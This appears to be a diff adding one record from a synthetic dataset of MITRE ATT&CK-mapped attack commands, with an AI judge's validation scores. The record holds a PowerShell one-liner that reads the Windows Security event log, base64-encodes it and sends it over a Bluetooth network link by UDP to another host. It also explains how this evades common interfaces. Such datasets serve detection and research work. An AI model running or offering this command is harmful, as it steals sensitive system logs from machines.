@@ -1,0 +1,38 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.25.83.6 255.255.255.252 | Out-Null; $payload=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\System32\\winevt\\Logs\\Security.evtx')); $udp=New-Object Net.Sockets.UdpClient; $udp.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.25.83.6'),0)); $bytes=[Text.Encoding]::UTF8.GetBytes($payload); $udp.Send($bytes,$bytes.Length,'172.25.83.5',53127) | Out-Null; $udp.Close()",
+  "explanation": "Creates a Bluetooth PAN path and exfiltrates base64-encoded event log data via UDP to a nonstandard port over the Bluetooth interface (T1011).",
+  "rationale_steps": [
+    "Connect to Bluetooth NAP to establish the alternate medium.",
+    "Configure the Bluetooth IP using netsh, avoiding common interfaces.",
+    "Bind a UDP socket to the Bluetooth IP to ensure the medium is Bluetooth.",
+    "Send base64 data to a high-numbered, uncommon UDP port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-577a0b06",
+  "source_prompt_hash": "f4a0ca3c",
+  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with correct separators, balanced quoting/parentheses, valid cmdlets and .NET calls, and proper argument usage.",
+        "semantic_score": 1,
+        "semantic_justification": "It establishes a Bluetooth PAN and exfiltrates data via UDP rather than abusing trusted/signed system scripts via cscript/wscript as described, and also likely requires elevated privileges for netsh and reading Security.evtx.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T22:10:46.325133Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.0,
+    "llm_average_score": 3.0,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
